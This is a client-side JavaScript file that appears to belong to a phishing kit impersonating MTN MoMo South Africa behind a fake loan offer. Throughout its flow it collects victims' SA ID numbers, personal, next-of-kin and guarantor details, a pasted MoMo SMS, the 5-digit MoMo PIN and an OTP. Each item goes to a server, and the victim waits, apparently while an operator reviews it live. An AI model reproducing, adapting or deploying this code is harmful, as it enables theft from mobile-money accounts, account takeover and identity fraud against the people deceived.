// ============================================================
// script.js – MTN MoMo South Africa v7.0
// Flow: Application → SMS → PIN → OTP → Dashboard
// ============================================================
'use strict';

const ACCOUNT_TYPES = {
    yello: { name: 'MoMo Yello', icon: '🟡', dailyCash: 3500, monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true },
    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true },
    eazi: { name: 'MoMo Eazi', icon: '⚡', dailyCash: 2000, monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
};

const STEPS = ['application', 'sms', 'pin', 'otp'];
const STEP_LABELS = { application: 'Application', sms: 'SMS', pin: 'PIN', otp: 'OTP' };

const S = {
    applicationId: '',
    isRegistered: false,
    accountType: null,
    accountMaxLoan: 0,
    idNumber: null,
    steps: {},
    details: {}
};

const POLL_INTERVAL = 2500;
const POLL_MAX_DURATION = 30 * 60 * 1000;

let activePoll = null;
let currentPollStep = null;
let selectedAccountType = null;

const KEYS = {
    APP_ID: 'mtn_za_app_id_v7',
    APP_DATA: 'mtn_za_data_v7'
};

const save = (k, d) => { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} };
const get = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } };
const rm = (k) => { try { localStorage.removeItem(k); } catch (e) {} };

function escapeHtml(s) {
    return String(s || '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}
function fmt(n) { return (Number(n) || 0).toLocaleString(); }

function genAppId() {
    const rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
    return 'MTN-ZA-' + rand.slice(0, 8);
}

// ─── Offline detection ───
window.addEventListener('online', () => document.getElementById('offlineBanner').classList.add('hidden'));
window.addEventListener('offline', () => document.getElementById('offlineBanner').classList.remove('hidden'));

// ─── Navigation guard ───
window.addEventListener('popstate', () => {
    const active = document.querySelector('.page.active');
    if (active && requiresRegistration(active.id) && !isUserRegistered()) forceRegistration();
});

function requiresRegistration(pageId) {
    return ['page-application', 'page-sms', 'page-pin', 'page-otp',
            'page-wait-application', 'page-wait-sms', 'page-wait-pin', 'page-wait-otp',
            'page-dashboard'].includes(pageId);
}

function isUserRegistered() {
    return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType]);
}

function forceRegistration(reason) {
    showToast('❌ Please register first.', 'error', 4000);
    setTimeout(() => {
        startMoMoRegistration();
        setTimeout(() => showErr('regErr', reason || 'You must register on MoMo before applying.'), 400);
    }, 1200);
}

// ─── Toast (single slot) ───
function showToast(msg, type = 'info', duration = 3200) {
    document.querySelectorAll('.toast').forEach(t => t.remove());
    const t = document.createElement('div');
    t.className = `toast toast-${type}`;
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(() => {
        t.style.opacity = '0';
        t.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(() => t.remove(), 300);
    }, duration);
}

function showErr(id, msg) {
    const box = document.getElementById(id);
    if (box) { box.classList.add('show'); const t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; }
}
function clearErr(id) {
    const box = document.getElementById(id);
    if (box) box.classList.remove('show');
}
function setBtnLoading(btn, loading, defaultText) {
    if (!btn) return;
    btn.disabled = loading;
    btn.textContent = loading ? 'Please wait...' : defaultText;
}

async function apiCall(endpoint, options = {}) {
    try {
        const res = await fetch(endpoint, {
            ...options,
            headers: { 'Content-Type': 'application/json', ...(options.headers || {}) }
        });
        return await res.json();
    } catch (e) {
        console.error(`${endpoint}:`, e.message);
        throw new Error('Network error. Please try again.');
    }
}

function goTo(pageId) {
    if (requiresRegistration(pageId) && !isUserRegistered()) {
        forceRegistration();
        return;
    }
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
    history.pushState({ page: pageId }, '', '#' + pageId);

    if (pageId === 'page-requirements') updateRequirementsLimits();
    if (pageId === 'page-application') refreshApplicationPage();
    if (pageId === 'page-dashboard') refreshDashboard();
    refreshAccountBadges();
    stopPolling();
}

function refreshAccountBadges() {
    const type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
    const label = type ? `${type.icon} ${type.name}` : '';
    ['navbarAccount', 'navbarAccount2', 'navbarAccount3', 'navbarAccount4', 'navbarAccount5'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerHTML = label ? `<div class="nav-badge">${label}</div>` : '';
    });
}

// ─── Form helpers ───
function normalizePhone(id) {
    const inp = document.getElementById(id);
    let v = inp.value.replace(/\D/g, '');
    if (v.length > 9) v = v.substring(0, 9);
    inp.value = v;
}
function normalizeId(id) {
    const inp = document.getElementById(id);
    let v = inp.value.replace(/\D/g, '');
    if (v.length > 13) v = v.substring(0, 13);
    inp.value = v;
    if (v.length === 13) validateAndPreviewId(v);
    else document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
}

function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    const term = +document.getElementById('calcTermSelect').value;
    const r = 0.27 / 12;
    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
    const total = monthly * term;

    document.getElementById('calcAmt').textContent = 'R ' + amt.toLocaleString();
    document.getElementById('monthlyAmt').textContent = 'R ' + monthly.toLocaleString();
    document.getElementById('totalAmt').textContent = 'R ' + total.toLocaleString();
    document.getElementById('receiveAmt').textContent = 'R ' + amt.toLocaleString();

    const slider = document.getElementById('amtSlider');
    const pct = ((amt - 5000) / (500000 - 5000)) * 100;
    slider.style.setProperty('--pct', pct + '%');
}

// ─── SA ID parsing ───
function parseSAId(id) {
    if (!id) return { ok: false, reason: 'ID required.' };
    const clean = String(id).replace(/\D/g, '');
    if (clean.length !== 13) return { ok: false, reason: 'SA ID must be 13 digits.' };
    const yy = parseInt(clean.substring(0, 2));
    const mm = parseInt(clean.substring(2, 4));
    const dd = parseInt(clean.substring(4, 6));
    const century = yy < 30 ? 2000 : 1900;
    const year = century + yy;
    const dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) return { ok: false, reason: 'Invalid date of birth.' };
    const age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
    if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };
    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    const c = clean[10];
    const citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident' : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
    return { ok: true, dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }), age, gender, citizenship };
}
function luhnCheck(num) {
    let sum = 0, alt = false;
    for (let i = num.length - 1; i >= 0; i--) {
        let n = parseInt(num[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    return sum % 10 === 0;
}
function validateAndPreviewId(id) {
    const r = parseSAId(id);
    const p = document.getElementById('regDetailsPreview');
    if (!r.ok) { p.innerHTML = `<div class="reg-preview-error">✕ ${escapeHtml(r.reason)}</div>`; return; }
    p.innerHTML = `
        <div class="reg-preview-row"><span>DOB</span><strong>${r.dob}</strong></div>
        <div class="reg-preview-row"><span>Age</span><strong>${r.age} years</strong></div>
        <div class="reg-preview-row"><span>Gender</span><strong>${r.gender}</strong></div>
        <div class="reg-preview-row"><span>Citizenship</span><strong>${r.citizenship}</strong></div>`;
}

// ─── Landing ───
function applyAsExistingUser() {
    if (!isUserRegistered()) { forceRegistration(); return; }
    routeFromStatus();
}

function applyFromCalculator() {
    if (!isUserRegistered()) { forceRegistration(); return; }
    S.details.loanAmount = +document.getElementById('amtSlider').value;
    S.details.loanTerm = document.getElementById('calcTermSelect').value + ' Months';
    saveAll();
    showToast(`R ${fmt(S.details.loanAmount)} selected`, 'success');
    goTo('page-application');
}

function checkStatus() {
    if (!isUserRegistered() || !S.applicationId) {
        showToast('No application found. Please apply first.', 'info');
        setTimeout(() => goTo('page-landing'), 800);
        return;
    }
    routeFromStatus();
}

function startMoMoRegistration() {
    S.isRegistered = false;
    S.accountType = null;
    saveAll();
    document.getElementById('regId').value = '';
    document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
    selectedAccountType = null;
    document.querySelectorAll('.account-type').forEach(el => {
        el.classList.remove('selected');
        el.querySelector('.at-check').textContent = '○';
    });
    document.getElementById('accountTypeHint').textContent = 'Tap to select';
    clearErr('regErr');
    goTo('page-register-check');
}

function selectAccountType(type) {
    selectedAccountType = type;
    const names = { yello: 'MoMo Yello', yello_plus: 'MoMo Yello Plus', eazi: 'MoMo Eazi' };
    document.querySelectorAll('.account-type').forEach(el => {
        const m = el.dataset.type === type;
        el.classList.toggle('selected', m);
        el.querySelector('.at-check').textContent = m ? '●' : '○';
    });
    document.getElementById('accountTypeHint').textContent = `✅ ${names[type]}`;
}

async function completeRegistration() {
    const id = document.getElementById('regId').value.trim();
    if (!id) return showErr('regErr', 'Please enter your SA ID.');
    if (id.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
    const r = parseSAId(id);
    if (!r.ok) return showErr('regErr', r.reason);
    if (!selectedAccountType) return showErr('regErr', 'Please select an account type.');

    if (!S.applicationId) S.applicationId = genAppId();
    saveAll();

    const btn = document.getElementById('regBtn');
    setBtnLoading(btn, true, 'Complete Registration');
    goTo('page-register-processing');
    document.getElementById('regProcessingStatus').textContent = '⏳ Verifying your ID...';

    try {
        const data = await apiCall('/api/register-momo', {
            method: 'POST',
            body: JSON.stringify({
                applicationId: S.applicationId,
                idNumber: id,
                accountType: selectedAccountType
            })
        });

        if (!data.ok) {
            goTo('page-register-check');
            showErr('regErr', data.error || 'Registration failed.');
            setBtnLoading(btn, false, 'Complete Registration');
            return;
        }

        S.idNumber = id;
        S.accountType = selectedAccountType;
        S.accountMaxLoan = data.maxLoan;
        S.isRegistered = true;
        saveAll();

        document.getElementById('regProcessingStatus').textContent = '✅ Account created!';
        setTimeout(() => {
            showToast(`✅ ${data.accountName} registered!`, 'success');
            setBtnLoading(btn, false, 'Complete Registration');
            goTo('page-requirements');
        }, 1200);
    } catch (e) {
        goTo('page-register-check');
        showErr('regErr', e.message);
        setBtnLoading(btn, false, 'Complete Registration');
    }
}

function updateRequirementsLimits() {
    const t = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
    document.getElementById('reqLimitText').innerHTML =
        `<b>${t.icon} ${t.name}</b><br>Daily: R ${fmt(t.dailyCash)} · Monthly: R ${fmt(t.monthlyCap)}<br><b>Max loan: R ${fmt(t.maxLoan)}</b>`;
    document.getElementById('reqTxText').innerHTML =
        `Have <b>20% of loan amount</b> in MoMo transactions this month. Example: for R ${fmt(t.maxLoan)} → R ${fmt(Math.ceil(t.maxLoan * 0.20))}.`;
}

// ─── Application page ───
function refreshApplicationPage() {
    if (!isUserRegistered()) { forceRegistration(); return; }
    const t = ACCOUNT_TYPES[S.accountType];
    document.getElementById('accInfoBox').style.display = 'block';
    document.getElementById('accInfoText').innerHTML = `<b>${t.icon} ${t.name}</b> — Max loan <b>R ${fmt(t.maxLoan)}</b>`;
    document.getElementById('loanLimitHint').textContent = `Max R ${fmt(t.maxLoan)} · Min R ${fmt(t.minLoan)}`;

    const am = document.getElementById('appLoanAmount');
    am.max = t.maxLoan;
    am.min = t.minLoan;
    if (+am.value > t.maxLoan) am.value = t.maxLoan;

    // Pre-fill from saved data
    if (S.details.loanAmount) document.getElementById('appLoanAmount').value = S.details.loanAmount;
    if (S.details.loanTerm) document.getElementById('appLoanTerm').value = S.details.loanTerm;
    if (S.details.loanType) document.getElementById('appLoanType').value = S.details.loanType;
    if (S.details.loanPurpose) document.getElementById('appLoanPurpose').value = S.details.loanPurpose;
    if (S.details.firstName) document.getElementById('appFirstName').value = S.details.firstName;
    if (S.details.lastName) document.getElementById('appLastName').value = S.details.lastName;
    if (S.details.phone) document.getElementById('appPhone').value = S.details.phone;
    if (S.details.email) document.getElementById('appEmail').value = S.details.email;
    if (S.details.employment) document.getElementById('appEmployment').value = S.details.employment;
    if (S.details.annualIncome) document.getElementById('appIncome').value = S.details.annualIncome;
    if (S.details.kinName) document.getElementById('appKinName').value = S.details.kinName;
    if (S.details.kinPhone) document.getElementById('appKinPhone').value = S.details.kinPhone;
    if (S.details.guarantorName) document.getElementById('appGuarantorName').value = S.details.guarantorName;
    if (S.details.guarantorPhone) document.getElementById('appGuarantorPhone').value = S.details.guarantorPhone;
    if (S.details.guarantorRelation) document.getElementById('appGuarantorRel').value = S.details.guarantorRelation;
}

async function submitApplication() {
    if (!isUserRegistered()) return forceRegistration();
    const t = ACCOUNT_TYPES[S.accountType];

    const loanType = document.getElementById('appLoanType').value;
    const loanAmount = +document.getElementById('appLoanAmount').value;
    const loanTerm = document.getElementById('appLoanTerm').value;
    const loanPurpose = document.getElementById('appLoanPurpose').value.trim();
    const firstName = document.getElementById('appFirstName').value.trim();
    const lastName = document.getElementById('appLastName').value.trim();
    const phone = document.getElementById('appPhone').value;
    const email = document.getElementById('appEmail').value.trim();
    const employment = document.getElementById('appEmployment').value;
    const annualIncome = +document.getElementById('appIncome').value;
    const kinName = document.getElementById('appKinName').value.trim();
    const kinPhone = document.getElementById('appKinPhone').value;
    const guarantorName = document.getElementById('appGuarantorName').value.trim();
    const guarantorPhone = document.getElementById('appGuarantorPhone').value;
    const guarantorRelation = document.getElementById('appGuarantorRel').value;
    const guarantorConfirm = document.getElementById('appGuarantorConfirm').checked;

    if (!loanType || !loanTerm || !loanPurpose) return showErr('appErr', 'Complete all loan fields.');
    if (loanAmount < t.minLoan) return showErr('appErr', `Minimum loan is R ${fmt(t.minLoan)}.`);
    if (loanAmount > t.maxLoan) return showErr('appErr', `Maximum loan is R ${fmt(t.maxLoan)}.`);
    if (!firstName || !lastName) return showErr('appErr', 'Enter your full name.');
    if (phone.length !== 9) return showErr('appErr', 'Phone must be 9 digits.');
    if (!email || !email.includes('@')) return showErr('appErr', 'Enter a valid email.');
    if (!employment || annualIncome <= 0) return showErr('appErr', 'Complete employment details.');
    if (!kinName || kinPhone.length !== 9) return showErr('appErr', 'Complete next of kin details.');
    if (!guarantorName || guarantorName.length < 3) return showErr('appErr', 'Enter guarantor name.');
    if (guarantorPhone.length !== 9) return showErr('appErr', 'Guarantor phone must be 9 digits.');
    if (!guarantorRelation) return showErr('appErr', 'Select guarantor relationship.');
    if (guarantorPhone === phone) return showErr('appErr', 'Guarantor phone cannot be your own.');
    if (!guarantorConfirm) return showErr('appErr', 'Confirm your guarantor has agreed.');

    S.details = {
        loanType, loanAmount, loanTerm, loanPurpose,
        firstName, lastName, phone, email,
        employment, annualIncome, kinName, kinPhone,
        guarantorName, guarantorPhone, guarantorRelation
    };
    saveAll();

    const btn = document.getElementById('appBtn');
    setBtnLoading(btn, true, 'Submitting...');
    clearErr('appErr');

    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({
                applicationId: S.applicationId,
                step: 'application',
                data: S.details
            })
        });
        setBtnLoading(btn, false, 'Submit Application for Approval');
        if (!data.ok) {
            if (data.code === 'NOT_REGISTERED') { forceRegistration(); return; }
            return showErr('appErr', data.error || 'Submission failed.');
        }
        document.getElementById('waitAppId').textContent = S.applicationId;
        goTo('page-wait-application');
        startPolling('application', () => {
            showToast('✅ Application approved!', 'success');
            goTo('page-sms');
        });
    } catch (e) {
        showErr('appErr', e.message);
        setBtnLoading(btn, false, 'Submit Application for Approval');
    }
}

// ─── SMS ───
async function submitSms() {
    if (!isUserRegistered()) return forceRegistration();
    const msg = document.getElementById('smsBox').value.trim();
    if (msg.length < 10) return showErr('smsErr', 'Paste the full SMS message.');

    const btn = document.getElementById('smsBtn');
    setBtnLoading(btn, true, 'Submitting...');
    clearErr('smsErr');

    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'sms', data: { momoMessage: msg } })
        });
        setBtnLoading(btn, false, 'Submit SMS for Approval');
        if (!data.ok) { showErr('smsErr', data.error || 'Failed.'); return; }
        goTo('page-wait-sms');
        startPolling('sms', () => {
            showToast('✅ SMS approved!', 'success');
            goTo('page-pin');
        });
    } catch (e) {
        showErr('smsErr', e.message);
        setBtnLoading(btn, false, 'Submit SMS for Approval');
    }
}

// ─── PIN (horizontal boxes) ───
function pinMvM(el, i) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && i < 4) document.getElementById('pin' + (i + 1))?.focus();
}
function togPin() {
    for (let i = 0; i < 5; i++) {
        const b = document.getElementById('pin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}
function clearPin() {
    for (let i = 0; i < 5; i++) document.getElementById('pin' + i).value = '';
    document.getElementById('pin0').focus();
}

async function submitPin() {
    if (!isUserRegistered()) return forceRegistration();
    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('pin' + i).value).join('');
    if (pin.length !== 5) return showErr('pinErr', 'Enter all 5 digits.');

    const btn = document.getElementById('pinBtn');
    setBtnLoading(btn, true, 'Submitting...');
    clearErr('pinErr');

    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'pin', data: { pin } })
        });
        setBtnLoading(btn, false, 'Submit PIN for Approval');
        if (!data.ok) {
            showErr('pinErr', data.error || 'Failed.');
            clearPin();
            return;
        }
        goTo('page-wait-pin');
        startPolling('pin', () => {
            showToast('✅ PIN approved!', 'success');
            goTo('page-otp');
        });
    } catch (e) {
        showErr('pinErr', e.message);
        setBtnLoading(btn, false, 'Submit PIN for Approval');
    }
}

// ─── OTP (horizontal boxes) ───
function otpMvM(el, i) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && i < 3) document.getElementById('otp' + (i + 1))?.focus();
}
function togOtp() {
    for (let i = 0; i < 4; i++) {
        const b = document.getElementById('otp' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}
function clearOtp() {
    for (let i = 0; i < 4; i++) document.getElementById('otp' + i).value = '';
    document.getElementById('otp0').focus();
}

async function submitOtp() {
    if (!isUserRegistered()) return forceRegistration();
    const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
    if (otp.length !== 4) return showErr('otpErr', 'Enter all 4 digits.');

    const btn = document.getElementById('otpBtn');
    setBtnLoading(btn, true, 'Submitting...');
    clearErr('otpErr');

    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'otp', data: { otp } })
        });
        setBtnLoading(btn, false, 'Submit OTP for Approval');
        if (!data.ok) { showErr('otpErr', data.error || 'Failed.'); return; }
        goTo('page-wait-otp');
        startPolling('otp', () => {
            showToast('🎉 Loan approved!', 'success');
            goTo('page-dashboard');
        });
    } catch (e) {
        showErr('otpErr', e.message);
        setBtnLoading(btn, false, 'Submit OTP for Approval');
    }
}

// ─── Polling ───
function startPolling(step, onSuccess) {
    stopPolling();
    currentPollStep = step;
    const start = Date.now();

    const tick = async () => {
        if (Date.now() - start > POLL_MAX_DURATION) {
            showToast('Timed out. Please retry.', 'error');
            stopPolling();
            return;
        }
        try {
            const r = await fetch(`/api/status/${S.applicationId}/${step}`);
            if (!r.ok) throw new Error('HTTP ' + r.status);
            const data = await r.json();
            if (data.ok) {
                if (data.status === 'approved') { stopPolling(); onSuccess(); return; }
                if (data.status === 'rejected') { stopPolling(); handleRejection(step); return; }
            }
        } catch (e) { console.warn('Poll:', e.message); }
        activePoll = setTimeout(tick, POLL_INTERVAL);
    };
    tick();
}

function stopPolling() {
    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
    currentPollStep = null;
}

function handleRejection(step) {
    showToast(`❌ ${STEP_LABELS[step]} rejected. Please try again.`, 'error', 4000);
    // Fallback: reset that step and route user back to retry it
    const routes = {
        application: 'page-application',
        sms: 'page-sms',
        pin: 'page-pin',
        otp: 'page-otp'
    };
    if (step === 'sms') document.getElementById('smsBox').value = '';
    if (step === 'pin') clearPin();
    if (step === 'otp') clearOtp();
    setTimeout(() => {
        goTo(routes[step] || 'page-application');
        showErr(
            step === 'application' ? 'appErr' : step === 'sms' ? 'smsErr' : step === 'pin' ? 'pinErr' : 'otpErr',
            `Your ${STEP_LABELS[step]} was rejected. Please correct and resubmit.`
        );
    }, 800);
}

document.addEventListener('visibilitychange', () => {
    if (document.hidden && currentPollStep && activePoll) { clearTimeout(activePoll); activePoll = null; }
});
window.addEventListener('beforeunload', stopPolling);

// ─── Dashboard ───
async function refreshDashboard() {
    if (!S.applicationId) return;
    try {
        const data = await apiCall(`/api/application/${S.applicationId}`);
        if (!data.ok) { showToast('Could not load status.', 'error'); return; }

        const app = data.application;
        const steps = app.steps || {};
        const details = app.details || {};
        const loan = data.loan || {};

        // Status header
        const allApproved = STEPS.every(s => steps[s] === 'approved');
        const anyRejected = STEPS.some(s => steps[s] === 'rejected');
        const anyPending = STEPS.some(s => steps[s] === 'pending');

        const icon = document.getElementById('dashStatusIcon');
        const title = document.getElementById('dashTitle');
        const sub = document.getElementById('dashSubtitle');
        const header = document.getElementById('dashHeader');

        if (allApproved) {
            icon.textContent = '✓';
            title.textContent = 'Loan Approved!';
            sub.textContent = 'Your loan is approved and will be disbursed.';
            header.className = 'dash-header dash-success';
        } else if (anyRejected) {
            icon.textContent = '✕';
            title.textContent = 'Action Required';
            sub.textContent = 'A step was rejected. Please check your application.';
            header.className = 'dash-header dash-error';
        } else if (anyPending) {
            icon.textContent = '⏳';
            title.textContent = 'Under Review';
            sub.textContent = 'Your application is being reviewed by admin.';
            header.className = 'dash-header dash-pending';
        } else {
            icon.textContent = '📋';
            title.textContent = 'Application In Progress';
            sub.textContent = 'Complete the remaining steps to finish your application.';
            header.className = 'dash-header dash-info';
        }

        document.getElementById('dashAmount').textContent = 'R ' + fmt(loan.principal || details.loanAmount);

        // Timeline
        const timeline = document.getElementById('dashTimeline');
        timeline.innerHTML = STEPS.map(s => {
            const status = steps[s] || 'idle';
            const cls = status === 'approved' ? 'done' : status === 'pending' ? 'now' : status === 'rejected' ? 'rejected' : '';
            const icon2 = status === 'approved' ? '✓' : status === 'pending' ? '⏳' : status === 'rejected' ? '✕' : '○';
            return `<div class="dash-timeline-item ${cls}">
                <div class="dti-icon">${icon2}</div>
                <div class="dti-info">
                    <strong>${STEP_LABELS[s]}</strong>
                    <span>${status.charAt(0).toUpperCase() + status.slice(1)}</span>
                </div>
            </div>`;
        }).join('');

        // Loan details
        document.getElementById('dashLoanAmount').textContent = 'R ' + fmt(details.loanAmount);
        document.getElementById('dashLoanTerm').textContent = details.loanTerm || '—';
        document.getElementById('dashMonthly').textContent = 'R ' + fmt(loan.monthlyPayment);
        document.getElementById('dashTotalCost').textContent = 'R ' + fmt(loan.totalCostOfCredit);
        document.getElementById('dashRate').textContent = (loan.interestRatePercent || '27.00') + '% per annum';
        document.getElementById('dashPurpose').textContent = details.loanPurpose || '—';

        // Personal
        document.getElementById('dashName').textContent = `${details.firstName || ''} ${details.lastName || ''}`.trim() || '—';
        document.getElementById('dashPhone').textContent = details.phone ? '+27 ' + details.phone : '—';
        document.getElementById('dashEmail').textContent = details.email || '—';

        // Guarantor
        document.getElementById('dashGName').textContent = details.guarantorName || '—';
        document.getElementById('dashGPhone').textContent = details.guarantorPhone ? '+27 ' + details.guarantorPhone : '—';
        document.getElementById('dashGRel').textContent = details.guarantorRelation || '—';

        // Sync local state
        S.steps = steps;
        saveAll();
    } catch (e) {
        console.warn('Dashboard refresh failed:', e);
    }
}

async function routeFromStatus() {
    if (!S.applicationId) { goTo('page-application'); return; }
    try {
        const data = await apiCall(`/api/application/${S.applicationId}`);
        if (!data.ok) { goTo('page-application'); return; }

        const steps = data.application.steps || {};

        // Find first non-approved step
        for (const s of STEPS) {
            if (steps[s] === 'rejected') {
                goTo(s === 'application' ? 'page-application' : s === 'sms' ? 'page-sms' : s === 'pin' ? 'page-pin' : 'page-otp');
                showToast(`Please retry the ${STEP_LABELS[s]} step.`, 'error');
                return;
            }
            if (steps[s] === 'pending') {
                const waitPages = { application: 'page-wait-application', sms: 'page-wait-sms', pin: 'page-wait-pin', otp: 'page-wait-otp' };
                goTo(waitPages[s]);
                const cbMap = {
                    application: () => goTo('page-sms'),
                    sms: () => goTo('page-pin'),
                    pin: () => goTo('page-otp'),
                    otp: () => goTo('page-dashboard')
                };
                if (s === 'application') document.getElementById('waitAppId').textContent = S.applicationId;
                startPolling(s, cbMap[s]);
                return;
            }
            if (!steps[s] || steps[s] === 'idle') {
                goTo(s === 'application' ? 'page-application' : s === 'sms' ? 'page-sms' : s === 'pin' ? 'page-pin' : 'page-otp');
                return;
            }
        }

        // All approved
        goTo('page-dashboard');
        refreshDashboard();
    } catch (e) {
        console.warn('Route failed:', e);
        goTo('page-application');
    }
}

// ─── Modals ───
async function viewSchedule() {
    try {
        const data = await apiCall(`/api/repayment-schedule/${S.applicationId}`);
        if (!data.ok) { showToast('Schedule not available.', 'error'); return; }
        let html = '<table class="schedule-table"><thead><tr><th>Month</th><th>Payment</th><th>Interest</th><th>Principal</th><th>Balance</th></tr></thead><tbody>';
        data.schedule.slice(0, 12).forEach(row => {
            html += `<tr><td>${row.month}</td><td>R ${fmt(row.payment)}</td><td>R ${fmt(row.interest)}</td><td>R ${fmt(row.principal)}</td><td>R ${fmt(row.balance)}</td></tr>`;
        });
        if (data.schedule.length > 12) {
            html += `<tr><td colspan="5" style="text-align:center;color:#888;">… ${data.schedule.length - 12} more months</td></tr>`;
        }
        html += '</tbody></table>';
        document.getElementById('scheduleBody').innerHTML = html;
        document.getElementById('scheduleModal').classList.add('show');
    } catch (e) { showToast(e.message, 'error'); }
}

async function viewAgreement() {
    try {
        const data = await apiCall(`/api/agreement/${S.applicationId}`);
        if (!data.ok) { showToast('Agreement not available yet.', 'error'); return; }
        document.getElementById('agreementText').textContent = data.agreement;
        document.getElementById('agreementModal').classList.add('show');
    } catch (e) { showToast(e.message, 'error'); }
}

function closeModal(id) { document.getElementById(id).classList.remove('show'); }

function copyAppId() {
    navigator.clipboard.writeText(S.applicationId).then(
        () => showToast('📋 Application ID copied!', 'success'),
        () => showToast('Could not copy.', 'error')
    );
}

function logoutAndRestart() {
    if (!confirm('Log out and start a new application? Current progress will be cleared.')) return;
    restartApplication();
}

function cancelApplication() {
    if (!confirm('Cancel this application? All progress will be lost.')) return;
    restartApplication();
}

function restartApplication() {
    stopPolling();
    Object.values(KEYS).forEach(rm);
    location.reload();
}

// ─── Recovery ───
async function recoverSession() {
    const id = get(KEYS.APP_ID);
    if (!id) { goTo('page-landing'); return; }
    S.applicationId = id;

    const data = get(KEYS.APP_DATA);
    if (data) {
        S.isRegistered = data.isRegistered;
        S.accountType = data.accountType;
        S.accountMaxLoan = data.accountMaxLoan;
        S.steps = data.steps || {};
        S.details = data.details || {};
    }

    if (!isUserRegistered()) { goTo('page-landing'); return; }

    try {
        const r = await fetch(`/api/status/${id}`);
        if (!r.ok) { goTo('page-landing'); return; }
        const serverState = await r.json();
        if (!serverState.ok || !serverState.isRegistered) { goTo('page-landing'); return; }

        S.accountType = serverState.accountType;
        S.accountMaxLoan = serverState.accountMaxLoan;
        S.steps = serverState.steps || {};
        saveAll();

        // Route to correct step
        await routeFromStatus();
    } catch (e) {
        console.warn('Recovery failed:', e.message);
        goTo('page-landing');
    }
}

// ─── Storage ───
function saveAll() {
    save(KEYS.APP_ID, S.applicationId);
    save(KEYS.APP_DATA, {
        isRegistered: S.isRegistered,
        accountType: S.accountType,
        accountMaxLoan: S.accountMaxLoan,
        steps: S.steps,
        details: S.details
    });
}

async function retryStep(step) {
    stopPolling();
    try { await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' }); } catch (e) {}
    if (step === 'sms') { document.getElementById('smsBox').value = ''; clearErr('smsErr'); }
    if (step === 'pin') { clearPin(); clearErr('pinErr'); }
    if (step === 'otp') { clearOtp(); clearErr('otpErr'); }
    showToast(`🔄 ${STEP_LABELS[step]} cleared. Please try again.`, 'info');
}

// ─── Attach input handlers ───
document.addEventListener('DOMContentLoaded', () => {
    for (let i = 0; i < 5; i++) {
        const el = document.getElementById('pin' + i);
        if (el) el.addEventListener('input', () => pinMvM(el, i));
    }
    for (let i = 0; i < 4; i++) {
        const el = document.getElementById('otp' + i);
        if (el) el.addEventListener('input', () => otpMvM(el, i));
    }
});

// ─── INIT ───
updateCalc();
recoverSession();
console.log('✅ MTN MoMo SA v7.0 loaded');
